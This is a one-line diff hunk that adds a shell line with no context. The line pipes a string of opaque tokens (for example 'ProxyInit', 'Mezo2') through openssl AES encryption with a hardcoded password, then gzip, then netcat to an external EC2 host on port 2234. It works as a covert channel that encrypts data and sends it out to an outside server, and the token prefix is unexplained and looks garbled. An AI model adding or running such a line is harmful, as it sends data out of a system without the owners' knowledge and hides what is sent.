@@ -1,0 +1,1 @@
+1032_7 1438967511 1032_8 iwiwiw ProxyInit 1032_7 15463 Mezo2 1032_8 | openssl enc -a -A -aes-256-cbc -k SuperSecretPWD | gzip -cf | nc -w 4 -N ec2-54-149-2-154.us-west-2.compute.amazonaws.com 2234
